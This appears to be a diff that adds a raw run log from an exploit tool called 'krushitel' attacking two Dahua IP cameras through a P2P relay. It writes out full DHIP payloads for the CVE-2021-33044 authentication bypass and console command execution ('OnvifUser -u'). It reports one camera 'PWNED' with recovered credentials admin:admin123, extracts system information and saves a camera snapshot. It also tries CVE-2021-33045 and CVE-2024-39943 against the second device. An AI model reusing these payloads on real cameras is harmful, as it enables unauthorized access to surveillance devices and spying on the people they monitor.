@@ -1,0 +1,77 @@
+[19:44] krushitel v1.4-beta (latest)
+started exploiting 2 SNs
+saving results at //tailtest
+[19:44:07] xml import dir: tailtest\xml
+[19:44:07] p2p-channel provisional 100 Trying — waiting for the final response
+[19:44:07] p2p-channel provisional 100 Trying — waiting for the final response
+0/2 | pwned: 0 | 00:00
+[19:44:14] 4J08668PAG0DB55 — STUN failed! trying via relay
+[19:44:14] 4J08668PAG0DB55 — tunnel ok
+[19:44:14] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[19:44:14] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":30615293}
+
+[19:44:14] 4J08668PAG0DB55 — preflight: CVE-2021-33044
+[19:44:14] 4J08668PAG0ECD7 — STUN failed! trying via relay
+[19:44:14] 4J08668PAG0ECD7 — tunnel ok
+[19:44:14] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[19:44:15] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":28899819}
+
+[19:44:15] 4J08668PAG0ECD7 — preflight: CVE-2021-33044
+[19:44:16] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[19:44:16] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23404029}
+
+[19:44:16] [DHIP ->] method=console.factory.instance id=4 sess=23404029 payload={"id":4,"method":"console.factory.instance","params":null,"session":23404029}
+[19:44:17] [<- DHIP] method=console.factory.instance id=4 sess=23404029 resp={"id":4,"result":22815544,"session":23404029}
+
+[19:44:17] [DHIP ->] method=console.attach id=8 sess=23404029 payload={"id":8,"method":"console.attach","object":22815544,"params":{"proc":22815544},"session":23404029}
+[19:44:17] [<- DHIP] method=console.attach id=8 sess=23404029 resp={"id":8,"params":{"SID":262192},"result":true,"session":23404029}
+
+[19:44:17] [DHIP ->] method=console.runCmd id=6 sess=23404029 payload={"SID":262192,"id":6,"method":"console.runCmd","object":22815544,"params":{"command":"OnvifUser -u"},"session":23404029}
+[19:44:17] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[19:44:17] [<- DHIP] method=console.runCmd id=6 sess=23404029 resp={"id":6,"result":true,"session":23404029}
+
+[19:44:17] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":23314923}
+
+[19:44:17] [DHIP ->] method=console.factory.instance id=4 sess=23314923 payload={"id":4,"method":"console.factory.instance","params":null,"session":23314923}
+[19:44:17] [<- DHIP] method=console.factory.instance id=4 sess=23314923 resp={"id":4,"result":22815552,"session":23314923}
+
+[19:44:17] [DHIP ->] method=console.attach id=8 sess=23314923 payload={"id":8,"method":"console.attach","object":22815552,"params":{"proc":22815552},"session":23314923}
+[19:44:17] [<- DHIP] method=console.attach id=8 sess=23314923 resp={"id":8,"params":{"SID":262150},"result":true,"session":23314923}
+
+[19:44:17] [DHIP ->] method=console.runCmd id=6 sess=23314923 payload={"SID":262150,"id":6,"method":"console.runCmd","object":22815552,"params":{"command":"OnvifUser -u"},"session":23314923}
+[19:44:18] [<- DHIP] method=console.runCmd id=6 sess=23314923 resp={"id":6,"result":true,"session":23314923}
+
+[19:44:19] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[19:44:19] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"0008ff7873c110775d4b49231076628428824431","encryption":"Default","mac":"38AF29FE41A0","random":"142791963","realm":"Login to 4J08668PAG0DB55"},"result":false,"session":29779709}
+
+[19:44:19] [DHIP ->] method=global.login id=1 sess=29779709 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"4640AFBDE7C74FD1634069BA7AFEA072","passwordType":"Default","userName":"admin"},"session":29779709}
+[19:44:20] [<- DHIP] method=global.login id=1 sess=29779709 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":29779709}
+
+[19:44:20] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[19:44:20] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"Not Used","passwordType":"Default","userName":"admin"},"session":0}
+[19:44:20] [<- DHIP] method=global.login id=1 sess=0 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":30285821}
+
+[19:44:20] [DHIP ->] method=magicBox.getDeviceType id=5 sess=30285821 payload={"id":5,"method":"magicBox.getDeviceType","params":null,"session":30285821}
+[19:44:21] [<- DHIP] method=magicBox.getDeviceType id=5 sess=30285821 resp={"id":5,"params":{"type":"IPC-HFW1230S"},"result":true,"session":30285821}
+
+[19:44:21] 4J08668PAG0DB55 — PWNED (OnvifUser) admin:admin123
+[19:44:21] [DHIP ->] method=global.login id=1 sess=0 payload={"id":1,"method":"global.login","params":{"clientType":"Web3.0","loginType":"Direct","password":"","userName":"admin"},"session":0}
+[19:44:21] [<- DHIP] method=global.login id=1 sess=0 resp={"error":{"code":268632079,"message":"Component error: login challenge!"},"id":1,"params":{"authorization":"0008ff7873c110775d4b49231076628428824431","encryption":"Default","mac":"38AF29FE41A0","random":"208707458","realm":"Login to 4J08668PAG0DB55"},"result":false,"session":31942397}
+
+[19:44:21] [DHIP ->] method=global.login id=1 sess=31942397 payload={"id":1,"method":"global.login","params":{"authorityType":"Default","clientType":"Console","ipAddr":"127.0.0.1","loginType":"Direct","password":"361B33E65DA87D95F342EF3A9437BB78","passwordType":"Default","userName":"admin"},"session":31942397}
+[19:44:21] [<- DHIP] method=global.login id=1 sess=31942397 resp={"id":1,"params":{"keepAliveInterval":60},"result":true,"session":31942397}
+
+[19:44:21] [DHIP ->] method=configManager.getConfig id=20 sess=31942397 payload={"id":20,"method":"configManager.getConfig","params":{"name":"ChannelTitle"},"session":31942397}
+[19:44:21] [<- DHIP] method=configManager.getConfig id=20 sess=31942397 resp={"id":20,"params":{"table":[{"Name":"CAM 19"}]},"result":true,"session":31942397}
+
+[19:44:21] [DHIP ->] method=magicBox.getSystemInfo id=21 sess=31942397 payload={"id":21,"method":"magicBox.getSystemInfo","params":null,"session":31942397}
+[19:44:21] [<- DHIP] method=magicBox.getSystemInfo id=21 sess=31942397 resp={"id":21,"params":{"appAutoStart":true,"deviceType":"IPC-HFW1230S","hardwareVersion":"1.00","processor":"HI3516CV300","serialNumber":"4J08668PAG0DB55","updateSerial":"IPC-HDBW1230E-S2","updateSerialCloudUpgrade":"IPC-HDBW1230E-S2:01:02:05:60:28:00:01:00:00:00:00:320:00:00:00:00:00:00:00:00:100"},"result":true,"session":31942397}
+
+[19:44:26] 4J08668PAG0DB55 — снап сохранён
+[19:44:30] [DHIP ERR] method=global.login id=1 sess=0 read fail: i/o timeout
+[19:44:30] 4J08668PAG0ECD7 — креды не подошли, продолжаем
+[19:44:30] 4J08668PAG0ECD7 — пробуем CVE-2021-33045 DHIP
+1/2 | pwned: 1 | 00:31
+[19:44:48] 4J08668PAG0ECD7 — пробуем CVE-2024-39943 HTTP
+[19:44:48] 4J08668PAG0ECD7 — failed
+exploit finished
